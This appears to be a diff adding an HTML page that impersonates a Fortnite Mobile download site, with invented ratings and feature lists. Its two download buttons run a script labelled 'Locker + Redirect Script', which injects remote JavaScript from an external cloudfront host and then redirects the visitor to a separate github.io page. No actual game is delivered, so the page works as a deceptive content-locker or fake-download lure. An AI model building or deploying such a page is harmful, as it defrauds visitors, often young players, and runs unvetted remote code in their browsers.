@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Download Fortnite Mobile</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #0d1117;
+      font-family: 'Segoe UI', sans-serif;
+      color: #ffffff;
+      padding: 0;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #161b22;
+      padding: 15px 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+
+    .header img {
+      height: 35px;
+    }
+
+    .container {
+      max-width: 420px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    .card {
+      background-color: #161b22;
+      border-radius: 15px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .card img {
+      width: 100%;
+      height: auto;
+    }
+
+    .card-content {
+      padding: 16px;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+
+    .rating {
+      color: #facc15;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    .info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      margin-bottom: 16px;
+      color: #c9d1d9;
+    }
+
+    .tag {
+      background-color: #30363d;
+      padding: 5px 10px;
+      border-radius: 8px;
+    }
+
+    .description {
+      font-size: 15px;
+      line-height: 1.6;
+      color: #c9d1d9;
+      margin-bottom: 16px;
+    }
+
+    .features {
+      margin-bottom: 16px;
+    }
+
+    .features li {
+      font-size: 14px;
+      margin-bottom: 6px;
+      color: #d1d5db;
+    }
+
+    .download-btn {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background: linear-gradient(to right, #0ea5e9, #3b82f6);
+      color: #fff;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      text-decoration: none;
+      transition: background 0.3s;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .download-btn:hover {
+      background: linear-gradient(to right, #0284c7, #2563eb);
+    }
+
+    .screenshot {
+      margin-top: 20px;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .screenshot img {
+      width: 100%;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <div class="header">
+    <img src="https://i.postimg.cc/sXR1112v/20250513-234241.png" alt="Logo" />
+  </div>
+
+  <div class="container">
+    <div class="card">
+      <img src="https://i.postimg.cc/59ZbRPX5/fortnite-header.jpg" alt="Fortnite Cover" />
+      <div class="card-content">
+        <div class="title">Fortnite Mobile</div>
+        <div class="rating">⭐ 4.6 (10M+ reviews)</div>
+        <div class="info">
+          <span class="tag">Battle Royale</span>
+          <span>1.6 GB</span>
+        </div>
+        <div class="description">
+          Drop into Fortnite anywhere. Squad up with friends and fight to be the last one standing in the most popular battle royale game on mobile.
+        </div>
+        <ul class="features">
+          <li>⚔️ Fast-paced 100-player Battle Royale matches</li>
+          <li>🎯 Intense building mechanics with real-time combat</li>
+          <li>🧍 Customize your character with unique outfits</li>
+          <li>🕹️ Controller support for better gameplay</li>
+          <li>🌍 Cross-platform play with console and PC players</li>
+          <li>🚁 Regular updates and seasonal events</li>
+        </ul>
+        <a class="download-btn" onclick="showLocker('fortnite')">Download Game</a>
+      </div>
+    </div>
+
+    <div class="screenshot">
+      <img src="https://i.postimg.cc/9XqjZGLD/Fortnite-Chapter-6-hunters-release-date-7fe4ab2.jpg" alt="Fortnite Gameplay" />
+    </div>
+
+    <a class="download-btn" onclick="showLocker('fortnite')">Download Now</a>
+  </div>
+
+  <!-- Locker + Redirect Script -->
+  <script>
+    function showLocker(gameId) {
+      localStorage.setItem('unlockGame', gameId);
+      var script = document.createElement('script');
+      script.src = 'https://d2yc6hxtq0phup.cloudfront.net/4351b50.js';
+      script.onload = function () {
+        window.location.href = 'https://mavericksgames.github.io/Neo/redirect.html';
+      };
+      document.body.appendChild(script);
+    }
+  </script>
+</body>
+</html>
